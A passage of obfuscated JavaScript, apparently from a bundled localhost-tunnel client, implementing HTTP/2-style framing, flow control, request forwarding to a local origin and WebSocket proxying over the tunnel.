                    this[fS(0x748)] = this['buffer'][fS(0xcfc)] ? Buffer[fS(0x6ef)]([
                        this['buffer'],
                        f
                    ]) : f, this[fS(0x1a4)]();
                });
                continue;
            }
            break;
        }
    }
    [a0c4(0x1a4)]() {
        const fT = a0c4, a = {
                'CakAk': function (b, c) {
                    return b > c;
                },
                'zUVEC': function (b, c) {
                    return b >= c;
                },
                'CQXhG': 'connection\x20closed'
            };
        while (a[fT(0x91e)](this[fT(0x376)][fT(0xcfc)], 0x0)) {
            const b = this[fT(0x376)][0x0];
            if (a['zUVEC'](this['buffer'][fT(0xcfc)], b['need'])) {
                this[fT(0x376)][fT(0xd5e)]();
                const c = this['buffer']['subarray'](0x0, b[fT(0x6a9)]);
                this['buffer'] = this[fT(0x748)]['subarray'](b[fT(0x6a9)]), b['resolve'](c);
            } else {
                if (this[fT(0x999)] !== null)
                    this[fT(0x376)][fT(0xd5e)](), b[fT(0x532)](this[fT(0x999)]);
                else {
                    if (this[fT(0x443)])
                        this[fT(0x376)][fT(0xd5e)](), b[fT(0x532)](new Error(a[fT(0x4cc)]));
                    else
                        break;
                }
            }
        }
    }
    [a0c4(0x2b6)](a) {
        const fU = a0c4, b = {
                'YnWah': function (c, d) {
                    return c !== d;
                },
                'Jpuqz': function (c, d) {
                    return c >= d;
                }
            };
        if (b[fU(0xd93)](this[fU(0x999)], null))
            return Promise[fU(0x532)](this[fU(0x999)]);
        if (b[fU(0x656)](this[fU(0x748)][fU(0xcfc)], a)) {
            const c = this[fU(0x748)][fU(0xd15)](0x0, a);
            return this[fU(0x748)] = this[fU(0x748)][fU(0xd15)](a), Promise['resolve'](c);
        }
        if (this[fU(0x443)])
            return Promise['reject'](new Error(fU(0x880)));
        return new Promise((d, f) => {
            const fV = fU;
            this[fV(0x376)]['push']({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[fV(0x1a4)]();
        });
    }
}
class a0aH {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const fW = a0c4, l = fW(0xb79)[fW(0x3ff)]('|');
        let m = 0x0;
        while (!![]) {
            switch (l[m++]) {
            case '0':
                this[fW(0xb71)] = i;
                continue;
            case '1':
                this[fW(0x8ac)] = k || { 'printed': ![] };
                continue;
            case '2':
                this[fW(0xb1f)] = new Map();
                continue;
            case '3':
                this['connIndex'] = g;
                continue;
            case '4':
                this[fW(0x738)] = new a0al();
                continue;
            case '5':
                this[fW(0x21b)] = a0ac;
                continue;
            case '6':
                this[fW(0xb08)] = 0xffff;
                continue;
            case '7':
                this['control'] = null;
                continue;
            case '8':
                this['sock'] = a;
                continue;
            case '9':
                this[fW(0x987)] = ![];
                continue;
            case '10':
                this[fW(0x836)] = [];
                continue;
            case '11':
                this['showTunnel'] = j;
                continue;
            case '12':
                this[fW(0x38c)] = c;
                continue;
            case '13':
                this[fW(0x292)] = b;
                continue;
            case '14':
                this[fW(0x4a9)] = f;
                continue;
            case '15':
                this[fW(0x57a)] = h;
                continue;
            case '16':
                this[fW(0x5cc)] = ![];
                continue;
            case '17':
                this[fW(0x1d1)] = d;
                continue;
            case '18':
                this[fW(0x887)] = ![];
                continue;
            case '19':
                this[fW(0xa1e)] = new a0aG(a);
                continue;
            case '20':
                this[fW(0x4b6)] = new Map();
                continue;
            }
            break;
        }
    }
    [a0c4(0x7aa)](a, b, c, d = Buffer[a0c4(0x9b5)](0x0)) {
        const fX = a0c4, f = {
                'jpnpl': fX(0x702),
                'WBGCE': function (h, i) {
                    return h & i;
                }
            };
        if (d[fX(0xcfc)] > 0xffffff)
            throw new Error(f['jpnpl']);
        const g = Buffer[fX(0x9b5)](0x9);
        g[fX(0x57b)](d[fX(0xcfc)], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[fX(0xd57)](f[fX(0x85d)](c, 0x7fffffff), 0x5), this['sock'][fX(0x32b)](Buffer[fX(0x6ef)]([
            g,
            d
        ]));
    }
    ['sendHeaders'](a, b, c = ![]) {
        const fY = a0c4, d = {
                'VKIVM': function (h, i) {
                    return h(i);
                },
                'ensnM': function (h, i) {
                    return h | i;
                }
            }, f = d[fY(0x7dd)](a0ao, b), g = d[fY(0xd2f)](0x4, c ? 0x1 : 0x0);
        this['sendFrame'](0x1, g, a, f);
    }
    ['_waitWindow'](a) {
        const fZ = a0c4, b = {
                'QhUwP': function (c, d) {
                    return c > d;
                }
            };
        if (this['connectionWindow'] > 0x0 && b[fZ(0xcd2)](this[fZ(0xb1f)][fZ(0x5f2)](a) ?? 0xffff, 0x0))
            return Promise[fZ(0xa50)]();
        return new Promise(c => {
            const g0 = fZ;
            this['windowWaiters'][g0(0x21f)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0c4(0xa87)]() {
        const g1 = a0c4, a = {
                'gydXN': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[g1(0x836)]) {
            const d = this[g1(0xb1f)]['get'](c[g1(0xaed)]) ?? 0xffff;
            a[g1(0xd10)](this[g1(0xb08)], 0x0) && a['gydXN'](d, 0x0) ? c[g1(0xa50)]() : b['push'](c);
        }
        this['windowWaiters'] = b;
    }
    [a0c4(0x98e)]() {
        const g2 = a0c4;
        for (const a of this[g2(0x836)]) {
            a[g2(0xa50)]();
        }
        this['windowWaiters'] = [];
    }
    async [a0c4(0x91d)](a, b, c = ![]) {
        const g3 = a0c4, d = {
                'GuvXd': function (h, i) {
                    return h - i;
                },
                'uDrke': function (h, i) {
                    return h + i;
                },
                'KcoCx': function (h, i) {
                    return h < i;
                }
            }, f = b['length'];
        let g = 0x0;
        do {
            await this['_waitWindow'](a);
            if (this[g3(0x987)])
                return;
            const h = this['streamWindows'][g3(0x5f2)](a) ?? 0xffff, i = Math['min'](d[g3(0x281)](f, g), this[g3(0xb08)], h, this['peerMaxFrame']), j = c && d['uDrke'](g, i) >= f ? 0x1 : 0x0, k = b[g3(0xd15)](g, d[g3(0x57d)](g, i));
            this[g3(0xb08)] -= i, this['streamWindows'][g3(0x9fe)](a, d[g3(0x281)](h, i)), this[g3(0x7aa)](0x0, j, a, k), g += i;
        } while (d[g3(0xd78)](g, f));
    }
    [a0c4(0xbc1)](a, b) {
        const g4 = a0c4, c = {
                'mxMTu': function (d, f) {
                    return d & f;
                }
            };
        if (b > 0x0) {
            const d = Buffer[g4(0x9b5)](0x4);
            d[g4(0xd57)](c['mxMTu'](b, 0x7fffffff), 0x0), this[g4(0x7aa)](0x8, 0x0, a, d);
        }
    }
    async [a0c4(0x340)]() {
        const g5 = a0c4, a = await this['reader'][g5(0x2b6)](0x9), b = a[g5(0x904)](0x0, 0x3), c = a[0x3], d = a[0x4], f = a[g5(0xd7f)](0x5) & 0x7fffffff, g = await this[g5(0xa1e)][g5(0x2b6)](b);
        return [
            c,
            d,
            f,
            g
        ];
    }
    async [a0c4(0x476)](a, b, c) {
        const g6 = a0c4, d = {
                'hCagD': function (g, h) {
                    return g & h;
                },
                'FDEML': function (g, h) {
                    return g !== h;
                },
                'Jmswk': g6(0x93f)
            };
        if (a & 0x8) {
            const g = c[0x0];
            c = c[g6(0xd15)](0x1);
            if (g > c['length'])
                throw new Error(g6(0xac1));
            c = g ? c['subarray'](0x0, c[g6(0xcfc)] - g) : c;
        }
        d['hCagD'](a, 0x20) && (c = c[g6(0xd15)](0x5));
        const f = [c];
        while (!d[g6(0xdb6)](a, 0x4)) {
            const h = await this[g6(0x340)]();
            if (d[g6(0xb7b)](h[0x0], 0x9) || h[0x2] !== b)
                throw new Error(d['Jmswk']);
            f[g6(0x21f)](h[0x3]), a = h[0x1];
        }
        return this['decoder']['decode'](Buffer[g6(0x6ef)](f));
    }
    ['openControl'](a) {
        const g7 = a0c4, b = {
                'SHPyb': function (c, d) {
                    return c !== d;
                },
                'PDtVq': g7(0x85a),
                'aUAbw': '200'
            };
        if (b[g7(0xb7a)](this['control'], null))
            return;
        this[g7(0xbe5)] = new a0aJ(this, a, this[g7(0x57a)]), this[g7(0xd29)](a, [[
                b[g7(0x308)],
                b['aUAbw']
            ]]), this[g7(0xbe5)]['start'](this[g7(0x38c)], this[g7(0x1d1)], this[g7(0x4a9)], this[g7(0xc46)]);
    }
    [a0c4(0x5e6)](a, b) {
        const g8 = a0c4, c = {
                'PosOn': g8(0x1bc),
                'akQma': function (g, h, i) {
                    return g(h, i);
                },
                'nTorL': g8(0x85a),
                'HhxEN': g8(0x813),
                'VpqFb': g8(0xa4b),
                'UbhPS': g8(0x833),
                'cYXaa': g8(0x985),
                'WgBdr': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON[g8(0xcf1)](b[g8(0xcfc)] ? b[g8(0xa3c)](c[g8(0x4cf)]) : '{}'), h = c[g8(0x6d8)](parseInt, g[g8(0xb72)], 0xa);
            !Number[g8(0xb51)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[g8(0x581)](JSON['stringify']({ 'latestAppliedVersion': d }));
        this[g8(0xd29)](a, [
            [
                c[g8(0xd0a)],
                c[g8(0x5fd)]
            ],
            [
                c[g8(0x921)],
                c['UbhPS']
            ],
            [
                c[g8(0x80a)],
                c[g8(0xa19)](String, f[g8(0xcfc)])
            ]
        ]), this[g8(0x91d)](a, f, !![]);
    }
    ['requestFinished'](a, b) {
        const g9 = a0c4, c = {
                'YVDJb': g9(0x244),
                'xYZky': function (g, h) {
                    return g === h;
                },
                'dwtQt': g9(0x95f)
            }, d = c[g9(0x613)][g9(0x3ff)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                if (b[g9(0xb99)])
                    return;
                continue;
            case '1':
                if (c[g9(0x311)](b[g9(0x248)], c[g9(0x88a)])) {
                    this[g9(0x5e6)](a, Buffer[g9(0x6ef)](b[g9(0x274)]));
                    return;
                }
                continue;
            case '2':
                b['finished'] = !![];
                continue;
            case '3':
                this[g9(0x2c7)](a, b)[g9(0x22d)](() => {
                });
                continue;
            case '4':
                if (b[g9(0x8f5)])
                    return;
                continue;
            }
            break;
        }
    }
    async [a0c4(0x2c7)](a, b) {
        const ga = a0c4, c = {
                'cXprh': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'Yxwgf': function (d, f) {
                    return d === f;
                },
                'oJTRv': ga(0x985),
                'HSMdp': ga(0x39d),
                'tJwBp': ga(0xab8),
                'MdYvf': ga(0x521),
                'PXHYO': function (d, f) {
                    return d === f;
                },
                'iAKmQ': ga(0x248),
                'VgFbZ': ga(0x5ff),
                'YUnWa': function (d, f) {
                    return d(f);
                },
                'VzyNt': ga(0xa4b),
                'LsaiR': function (d, f) {
                    return d(f);
                },
                'FcHbO': ga(0x408),
                'nvTGn': ga(0x3e3),
                'yhryi': function (d, f) {
                    return d + f;
                },
                'saWfZ': function (d, f) {
                    return d + f;
                },
                'lkpAU': ga(0x8c2),
                'YZGeb': ga(0x85a),
                'FfmoO': ga(0x79a)
            };
        try {
            const d = await c[ga(0xc6c)](a0aM, this[ga(0x292)], b[ga(0xaf0)], b[ga(0x5b0)], b[ga(0x48d)], Buffer[ga(0x6ef)](b['body'])), f = [], g = [];
            for (const [k, l] of d[ga(0x48d)]) {
                const m = k['toLowerCase']();
                c['Yxwgf'](m, c['oJTRv']) && g[ga(0x21f)]([
                    m,
                    l
                ]);
                const n = m[ga(0x6ec)](c[ga(0x1e4)]) || m['startsWith'](c[ga(0x941)]) || m['startsWith'](ga(0x89c)) || m['startsWith'](':');
                (!n || m === c[ga(0x9fa)] || c[ga(0x29e)](m, c[ga(0x42f)]) || m === c[ga(0x5e3)]) && f['push']([
                    m,
                    l
                ]);
            }
            if (!f['some'](([o]) => o === ga(0xa4b))) {
                const o = c[ga(0x4b9)](a0aB, b[ga(0x5b0)]);
                o && f[ga(0x21f)]([
                    c['VzyNt'],
                    o
                ]);
            }
            const h = c[ga(0x4b9)](a0aF, f), i = c[ga(0x1c7)](d['status'], 0x65) ? 0xc8 : d[ga(0x8ab)], j = [
                    [
                        ga(0x85a),
                        c[ga(0x628)](String, i)
                    ],
                    ...g,
                    [
                        ga(0xad2),
                        h
                    ],
                    [
                        c[ga(0x439)],
                        c[ga(0xd91)]
                    ]
                ];
            this[ga(0xd29)](a, j);
            for await (const p of d[ga(0x274)]) {
                await this[ga(0x91d)](a, p, ![]);
            }
            await this[ga(0x91d)](a, Buffer[ga(0x9b5)](0x0), !![]);
        } catch (q) {
            this['log'][ga(0xb34)](c[ga(0x653)](c[ga(0xda5)](c[ga(0xcc5)], a), ga(0x5f0)) + q);
            try {
                this[ga(0xd29)](a, [[
                        c[ga(0x626)],
                        c[ga(0xb74)]
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0c4(0xbc9)]() {
        const gb = a0c4, a = {
                'wIeht': gb(0x9bb),
                'dTqJT': function (d, f) {
                    return d === f;
                },
                'pTwqd': function (d, f) {
                    return d & f;
                },
                'aapjw': function (d, f) {
                    return d % f;
                },
                'ltHDz': function (d, f) {
                    return d + f;
                },
                'zurCF': function (d, f) {
                    return d >= f;
                },
                'YbDsF': function (d, f) {
                    return d <= f;
                },
                'salAn': function (d, f) {
                    return d & f;
                },
                'gywnL': function (d, f) {
                    return d !== f;
                },
                'OfVwk': function (d, f) {
                    return d & f;
                },
                'hqvDc': function (d, f) {
                    return d === f;
                },
                'DuXVg': function (d, f) {
                    return d === f;
                }
            }, b = await this['reader']['readExact'](0x18);
        if (!b[gb(0x4e7)](Buffer[gb(0x581)](a['wIeht'])))
            throw new Error(gb(0xb5e));
        const c = Buffer[gb(0x9b5)](0x6);
        c[gb(0x250)](0x3, 0x0), c[gb(0xd57)](0x64, 0x2), this['sendFrame'](0x4, 0x0, 0x0, c);
        this[gb(0x5ca)] && !this[gb(0x8ac)][gb(0x89b)] && (process['stdout'][gb(0x32b)](this['tunnelUrl'] + '\x0a'), this[gb(0x8ac)]['printed'] = !![]);
        try {
            while (!this[gb(0x987)]) {
                const [d, f, g, h] = await this['readFrame']();
                if (a['dTqJT'](d, 0x4)) {
                    if (!a[gb(0x8aa)](f, 0x1)) {
                        if (a['aapjw'](h[gb(0xcfc)], 0x6))
                            throw new Error(gb(0xc79));
                        for (let i = 0x0; i < h[gb(0xcfc)]; i += 0x6) {
                            const j = h[gb(0x7f1)](i), k = h[gb(0xd7f)](i + 0x2);
                            if (j === 0x4) {
                                const l = k - 0xffff;
                                for (const m of this[gb(0xb1f)][gb(0xa7e)]()) {
                                    this['streamWindows'][gb(0x9fe)](m, Math[gb(0x23e)](0x0, a[gb(0xa53)](this['streamWindows']['get'](m), l)));
                                }
                            } else
                                a['dTqJT'](j, 0x5) && a[gb(0xb13)](k, 0x4000) && a[gb(0x1e9)](k, 0xffffff) && (this[gb(0x21b)] = k);
                        }
                        this['sendFrame'](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (d === 0x6) {
                    !a['salAn'](f, 0x1) && this[gb(0x7aa)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a[gb(0x8d8)](d, 0x8)) {
                    if (a[gb(0x5e7)](h[gb(0xcfc)], 0x4))
                        continue;
                    const n = a[gb(0xd63)](h['readUInt32BE'](0x0), 0x7fffffff);
                    g === 0x0 ? this[gb(0xb08)] += n : this[gb(0xb1f)][gb(0x9fe)](g, a['ltHDz'](this[gb(0xb1f)][gb(0x5f2)](g) ?? 0xffff, n));
                    this['_notifyWindows']();
                    continue;
                }
                if (d === 0x3) {
                    this['streams'][gb(0xdab)](g);
                    continue;
                }
                if (a[gb(0x8e4)](d, 0x7))
                    break;
                if (a[gb(0x8e4)](d, 0x1)) {
                    const o = await this['readHeaders'](f, g, h);
                    !this['streamWindows'][gb(0xa3d)](g) && this['streamWindows'][gb(0x9fe)](g, 0xffff);
                    this[gb(0x404)](g, f, o);
                    continue;
                }
                if (a[gb(0x786)](d, 0x0)) {
                    this[gb(0x3b9)](g, f, h);
                    continue;
                }
            }
        } finally {
            this[gb(0x987)] = !![], this[gb(0x98e)]();
            for (const p of this['streams'][gb(0x5ad)]()) {
                p[gb(0xc06)] && p[gb(0xc06)]['stop']();
            }
            try {
                this[gb(0xda9)][gb(0x4b0)]();
            } catch (q) {
            }
        }
    }
    ['handleHeaders'](a, b, c) {
        const gc = a0c4, d = {
                'UkekY': function (i, j) {
                    return i === j;
                },
                'MAZMp': function (i, j) {
                    return i & j;
                },
                'VKCbT': gc(0x917),
                'dRjSP': gc(0x64e),
                'LpwJW': gc(0x1ab),
                'FaCbB': gc(0x49e),
                'aNdmH': gc(0xb99),
                'Ldmqj': gc(0x1aa)
            }, f = {};
        for (const [i, j] of c) {
            i[gc(0x6ec)](':') ? f[i] = j : f[i[gc(0xc48)]()] = j;
        }
        const g = (f[a0aa] || '')['trim']()[gc(0xc48)]();
        if (d[gc(0x945)](g, a0ab)) {
            this[gc(0xd62)](a);
            d['MAZMp'](b, 0x1) && (this[gc(0xbe5)][gc(0x8f5)] = !![]);
            return;
        }
        const h = {
            'method': f[d[gc(0x8cb)]] || d[gc(0xc39)],
            'path': f[d[gc(0x451)]] || '/',
            'authority': f[d[gc(0x747)]] || '',
            'headers': c[gc(0xaf5)](([k]) => !k['startsWith'](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[gc(0x945)](g, d[gc(0x4ea)]) || d[gc(0x945)]((f[d['Ldmqj']] || '')[gc(0xc48)](), d[gc(0x4ea)]),
            'ended': Boolean(b & 0x1),
            'finished': ![]
        };
        this[gc(0x4b6)][gc(0x9fe)](a, h);
        if (h[gc(0xb99)])
            h['websocketProxy'] = new a0aI(this, a, h, this['origin'], this[gc(0x57a)]), h[gc(0xc06)]['start']();
        else
            h[gc(0x74d)] && this[gc(0x95d)](a, h);
    }
    ['handleData'](a, b, c) {
        const gd = a0c4, d = {
                'FngQw': function (g, h) {
                    return g !== h;
                },
                'hPHrt': function (g, h) {
                    return g === h;
                },
                'OcpPj': function (g, h) {
                    return g & h;
                },
                'YxAYd': function (g, h) {
                    return g !== h;
                },
                'worIr': function (g, h) {
                    return g(h);
                }
            };
        this['sendWindowUpdate'](0x0, c[gd(0xcfc)]), this['sendWindowUpdate'](a, c['length']);
        if (d[gd(0xa70)](this[gd(0xbe5)], null) && d['hPHrt'](this[gd(0xbe5)][gd(0xaed)], a)) {
            this[gd(0xbe5)]['feed'](c);
            d['OcpPj'](b, 0x1) && (this[gd(0xbe5)][gd(0x8f5)] = !![]);
            return;
        }
        const f = this[gd(0x4b6)][gd(0x5f2)](a);
        if (f === undefined)
            return;
        if (d[gd(0x5b9)](f['websocketProxy'], undefined)) {
            f[gd(0xc06)][gd(0x706)](c, d[gd(0x410)](Boolean, d[gd(0x670)](b, 0x1)));
            return;
        }
        c[gd(0xcfc)] && f[gd(0x274)][gd(0x21f)](c), d[gd(0x670)](b, 0x1) && (f[gd(0x74d)] = !![], this[gd(0x95d)](a, f));
    }
}
class a0aI {
    constructor(a, b, c, d, f) {
        const ge = a0c4, g = { 'PknvL': ge(0x886) }, h = g['PknvL'][ge(0x3ff)]('|');
        let i = 0x0;
        while (!![]) {
            switch (h[i++]) {
            case '0':
                this['origin'] = d;
                continue;
            case '1':
                this['stopped'] = ![];
                continue;
            case '2':
                this['connection'] = a;
                continue;
            case '3':
                this[ge(0x57a)] = f;
                continue;
            case '4':
                this['streamId'] = b;
                continue;
            case '5':
                this[ge(0xda9)] = null;
                continue;
            case '6':
                this[ge(0x98b)] = c;
                continue;
            case '7':
                this[ge(0x376)] = [];
                continue;
            case '8':
                this['queue'] = [];
                continue;
            }
            break;
        }
    }
    [a0c4(0x1c6)]() {
        this['run']()['catch'](() => {
        });
    }
    [a0c4(0x706)](a, b = ![]) {
        const gf = a0c4;
        a[gf(0xcfc)] && this[gf(0xc41)][gf(0x21f)](a), b && this['queue'][gf(0x21f)](null), this[gf(0xc5d)]();
    }
    [a0c4(0x87d)]() {
        const gg = a0c4, a = {
                'iKmUC': function (b, c) {
                    return b !== c;
                }
            };
        if (this[gg(0x987)])
            return;
        this[gg(0x987)] = !![], this['_wake']();
        if (a[gg(0x454)](this[gg(0xda9)], null))
            try {
                this[gg(0xda9)][gg(0x4b0)]();
            } catch (b) {
            }
    }
    [a0c4(0xc5d)]() {
        const gh = a0c4;
        for (const a of this[gh(0x376)]) {
            a();
        }
        this[gh(0x376)] = [];
    }
    async ['_next']() {
        const gi = a0c4;
        while (!this[gi(0x987)]) {
            if (this['queue'][gi(0xcfc)])
                return this[gi(0xc41)][gi(0xd5e)]();
            await new Promise(a => this[gi(0x376)]['push'](a));
        }
        return null;
    }
    async ['run']() {
        const gj = a0c4, a = {
                'uwfEK': function (b, c) {
                    return b(c);
                },
                'ntjaw': function (b, c) {
                    return b === c;
                },
                'rVzWw': gj(0x985),
                'AvlEz': gj(0x39d),
                'zuVlW': gj(0x89c),
                'anNhw': function (b, c) {
                    return b === c;
                },
                'HPGRT': 'connection',
                'BgWhY': gj(0x248),
                'TwpPi': function (b, c) {
                    return b === c;
                },
                'KQPgZ': function (b, c) {
                    return b === c;
                },
                'vdjIu': gj(0x85a),
                'fnGcN': function (b, c) {
                    return b(c);
                },
                'msKfQ': gj(0xad2),
                'hXOkF': gj(0x3e3),
                'yrImC': function (b, c) {
                    return b + c;
                },
                'cUjLi': function (b, c) {
                    return b + c;
                },
                'qDkIA': function (b, c) {
                    return b + c;
                },
                'ePFSp': gj(0xc38),
                'DSahp': gj(0xdc0)
            };
        try {
            this[gj(0xda9)] = await a['uwfEK'](a0aK, this[gj(0x292)]), this['sendHandshake']();
            const b = await a0aN(this[gj(0xda9)]), c = [], d = [];
            for (const [i, j] of b[gj(0x48d)]) {
                const k = i[gj(0xc48)]();
                a[gj(0x82f)](k, a[gj(0x717)]) && d['push']([
                    k,
                    j
                ]);
                const l = k[gj(0x6ec)](a[gj(0xc26)]) || k[gj(0x6ec)](gj(0xab8)) || k[gj(0x6ec)](a[gj(0x70d)]) || k[gj(0x6ec)](':');
                (!l || a['anNhw'](k, a[gj(0x5f8)]) || a[gj(0xcc2)](k, a[gj(0x214)]) || a[gj(0xa1c)](k, 'sec-websocket-accept')) && c[gj(0x21f)]([
                    k,
                    j
                ]);
            }
            const f = a0aF(c), g = a[gj(0x5e0)](b[gj(0x8ab)], 0x65) ? 0xc8 : b['status'], h = [
                    [
                        a[gj(0xcca)],
                        a['fnGcN'](String, g)
                    ],
                    ...d,
                    [
                        a[gj(0x518)],
                        f
                    ],
                    [
                        gj(0x408),
                        a[gj(0x602)]
                    ]
                ];
            this['connection'][gj(0xd29)](this['streamId'], h), this['writeToOrigin']()[gj(0x22d)](() => {
            }), await this[gj(0x5bc)](b[gj(0x58d)]);
        } catch (m) {
            this[gj(0x57a)]['warning'](a[gj(0xbe3)](a['cUjLi'](a[gj(0xd85)](a['ePFSp'], this['streamId']), a[gj(0x5c0)]), m));
            try {
                this['connection'][gj(0xd29)](this[gj(0xaed)], [[
                        a[gj(0xcca)],
                        '502'
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[gj(0x87d)]();
        }
    }
    async [a0c4(0x5bc)](a) {
        const gk = a0c4;
        a[gk(0xcfc)] && await this['connection'][gk(0x91d)](this[gk(0xaed)], a, ![]);
        for await (const b of this[gk(0xda9)]) {
            if (this[gk(0x987)])
                break;
            await this[gk(0x521)][gk(0x91d)](this[gk(0xaed)], b, ![]);
        }
        !this[gk(0x987)] && await this[gk(0x521)][gk(0x91d)](this['streamId'], Buffer[gk(0x9b5)](0x0), !![]);
    }
    async [a0c4(0x202)]() {
        const gl = a0c4, a = {
                'OjoQj': function (b, c) {
                    return b === c;
                }
            };
        while (!this[gl(0x987)]) {
            const b = await this[gl(0x58b)]();
            if (a['OjoQj'](b, null))
                return;
            try {
                this['sock'][gl(0x32b)](b);
            } catch (c) {
                this[gl(0x987)] = !![];
                return;
            }
        }
    }
    ['sendHandshake']() {
        const gm = a0c4, a = {
                'BRpiE': function (i, j) {
                    return i + j;
                },
                'lsUnT': function (i, j) {
                    return i + j;
                },
                'HBgZI': gm(0x5d0),
                'QvqDK': gm(0x3ac),
                'nRLub': function (i, j) {
                    return i === j;
                },
                'WdUuc': gm(0x920),
                'zNUOU': gm(0x521),
                'ShmNb': function (i, j) {
                    return i === j;
                },
                'ZxkDh': gm(0x248),
                'DwRjg': gm(0x985),
                'rlhID': gm(0x7d3),
                'BZFwP': gm(0xd9f),
                'iWNlS': gm(0x292),
                'cAtjZ': gm(0x617),
                'PWgIK': gm(0x790),
                'FyshC': gm(0x559),
                'ixNdz': 'Connection:\x20Upgrade',
                'oSojO': gm(0x95e),
                'NfyvH': gm(0xb92),
                'Mdbrt': gm(0xaa4)
            }, b = new URL(this['origin']), c = this[gm(0x98b)][gm(0x5b0)]['startsWith']('/') ? this['request']['path'] : a[gm(0x429)]('/', this['request']['path']), d = [a[gm(0x429)](a[gm(0xcd1)](a[gm(0xd4d)], c), a[gm(0x81a)])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[gm(0x98b)]['headers']) {
            const k = i[gm(0xc48)]();
            if (a['nRLub'](k, a[gm(0xbb8)]) || a[gm(0x743)](k, a[gm(0x737)]) || a[gm(0x74f)](k, a[gm(0x928)]) || a[gm(0x743)](k, a['DwRjg']) || k === a[gm(0x2ad)])
                continue;
            if (a[gm(0x74f)](k, gm(0x295)))
                f = !![];
            else {
                if (a['ShmNb'](k, a['BZFwP']))
                    g = !![];
                else
                    k === a[gm(0x495)] && (h = !![]);
            }
            d['push'](a['BRpiE'](i + ':\x20', j));
        }
        d[gm(0x21f)](a[gm(0xcd1)](a[gm(0xbae)], b[gm(0x920)])), !h && this[gm(0x98b)][gm(0x2af)] && d[gm(0x21f)](a[gm(0x429)](a[gm(0xc8a)], this[gm(0x98b)][gm(0x2af)])), !f && d[gm(0x21f)](a[gm(0xa34)] + a0k[gm(0xa8d)](0x10)[gm(0xa3c)](gm(0x7be))), !g && d[gm(0x21f)]('Sec-WebSocket-Version:\x2013'), d['push'](a['ixNdz']), d['push'](a[gm(0x76c)]), this[gm(0xda9)][gm(0x32b)](Buffer[gm(0x581)](a['BRpiE'](d[gm(0x6e5)]('\x0d\x0a'), a[gm(0x756)]), a['Mdbrt']));
    }
}
class a0aJ {
    constructor(a, b, c, d = {}) {
        const gn = a0c4, f = {
                'VoZUs': gn(0x324),
                'GqJOz': function (i, j) {
                    return i === j;
                }
            }, g = f[gn(0x35f)][gn(0x3ff)]('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[gn(0xaed)] = b;
                continue;
            case '1':
                this[gn(0x1f9)] = f[gn(0x4dc)](d[gn(0x4a0)], !![]);
                continue;
            case '2':
                this['connection'] = a;
                continue;
            case '3':
                this[gn(0x57a)] = c;
                continue;
            case '4':
                this[gn(0x748)] = Buffer[gn(0x9b5)](0x0);
                continue;
            case '5':
                this[gn(0x8f5)] = ![];
                continue;
            }
            break;
        }
    }
    ['start'](a, b, c, d) {
        const go = a0c4, f = {
                'ftUfW': function (g, h) {
                    return g(h);
                },
                'RSdps': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this['connection'][go(0x91d)](this[go(0xaed)], f[go(0xaf1)](a0aq, 0x0), ![]), this[go(0x521)]['sendData'](this['streamId'], f['RSdps'](a0ar, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0c4(0x706)](a) {
        const gp = a0c4, b = {
                'wMjwL': function (f, g) {
                    return f + g;
                },
                'XTHPW': gp(0x304),
                'JFrcF': function (f, g) {
                    return f + g;
                },
                'RMnKg': function (f, g) {
                    return f + g;
                },
                'tgaKC': gp(0x1c5)
            };
        this[gp(0x748)] = this[gp(0x748)][gp(0xcfc)] ? Buffer[gp(0x6ef)]([
            this['buffer'],
            a
        ]) : a;
        let c, d;
        [c, d] = a0as(this['buffer']), this[gp(0x748)] = d;
        for (const f of c) {
            try {
                const g = a0ax(f);
                if (g[gp(0xc9b)])
                    continue;
                g['ok'] ? (this[gp(0x57a)][gp(0xb82)](b['wMjwL'](b[gp(0x232)], g[gp(0x712)] || gp(0x9a3))), this['connection'][gp(0x5cc)] = !![]) : (this[gp(0x57a)][gp(0xb34)](b[gp(0x66c)](gp(0x8e9), g[gp(0xbb0)] || 'unknown\x20error')), this[gp(0x521)][gp(0x887)] = !![], this[gp(0x521)]['stopped'] = !![]);
            } catch (h) {
                this[gp(0x57a)]['debug'](b[gp(0x6b3)](b[gp(0x1f5)], h));
            }
        }
    }
}
function a0aK(a) {
    const gq = a0c4, b = {
            'iCzmW': '0|3|1|4|2',
            'argvf': function (c, d) {
                return c(d);
            },
            'sdTyO': function (c, d, f) {
                return c(d, f);
            },
            'KayTs': gq(0xbb0),
            'rTFcY': gq(0xb56),
            'gVppk': gq(0xb3c),
            'HKARz': function (c, d) {
                return c(d);
            },
            'ZCQDu': function (c, d) {
                return c === d;
            }
        };
    return new Promise((c, d) => {
        const gs = gq, f = {
                'jSmsb': function (n, o, p) {
                    const gr = a0b;
                    return b[gr(0x54a)](n, o, p);
                },
                'nrntz': b[gs(0x760)],
                'mpKQO': 'secureConnect'
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b[gs(0x6db)](d, new Error(b[gs(0x86d)]));
            return;
        }
        if (![
                gs(0xac7),
                b[gs(0xbef)]
            ][gs(0x38b)](g[gs(0x5a5)]) || !g[gs(0x3cc)]) {
            b[gs(0x480)](d, new Error(b[gs(0x86d)]));
            return;
        }
        const h = b['ZCQDu'](g['protocol'], b[gs(0xbef)]), i = g[gs(0x694)] || (h ? 0x1bb : 0x50), j = a0i[gs(0x3ae)]({
                'host': g[gs(0x3cc)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const gt = gs, q = b[gt(0xcd7)][gt(0x3ff)]('|');
                let r = 0x0;
